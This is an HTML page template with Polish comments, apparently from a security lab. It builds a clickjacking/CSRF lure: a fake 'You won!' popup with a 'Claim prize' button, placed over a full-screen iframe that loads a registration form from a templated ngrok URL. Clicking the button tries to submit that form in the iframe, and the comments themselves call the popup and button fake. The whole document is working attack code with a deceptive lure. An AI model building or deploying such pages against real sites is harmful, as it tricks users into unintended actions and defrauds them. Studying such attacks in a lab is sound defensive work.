<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Wygrałeś!</title>
    <style>
        /* iframe zajmuje cały ekran i jest widoczny */
        iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            border: none;
            z-index: 1;
        }

        /* Styl dla okna "Wygrałeś!" z obrysem */
        .popup {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 300px;
            padding: 20px;
            background-color: white;
            border: 2px solid #333; /* Ciemnoszary obrys */
            box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.2);
            border-radius: 8px;
            text-align: center;
            font-family: Arial, sans-serif;
            z-index: 2;
        }

        /* Styl nagłówka */
        .popup .message {
            font-size: 1.5em;
            font-weight: bold;
            color: green;
            margin-bottom: 15px;
        }

        /* Styl przycisku */
        .popup .fake-button {
            padding: 10px 20px;
            font-size: 1.2em;
            color: white;
            background-color: blue;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
    </style>
</head>
<body>

<!-- Osadzenie formularza rejestracyjnego w iframe -->
<iframe id="targetFrame" src="{{ ngrok_url }}/register_html" frameborder="0"></iframe>

<!-- Popup z fałszywym komunikatem i przyciskiem na środku ekranu -->
<div class="popup">
    <div class="message">Wygrałeś!</div> <!-- Fałszywy nagłówek -->
    <button class="fake-button" onclick="claimPrize()">Odbierz nagrodę</button> <!-- Fałszywy przycisk -->
</div>

<script>
    // Funkcja do przesłania formularza w iframe po kliknięciu fałszywego przycisku
    function claimPrize() {
        const iframe = document.getElementById('targetFrame');
        try {
            iframe.contentWindow.document.getElementById('registerForm').submit();
        } catch (error) {
            console.error("Brak dostępu do zawartości iframe z powodu polityki bezpieczeństwa.");
        }
    }
</script>

</body>
</html>
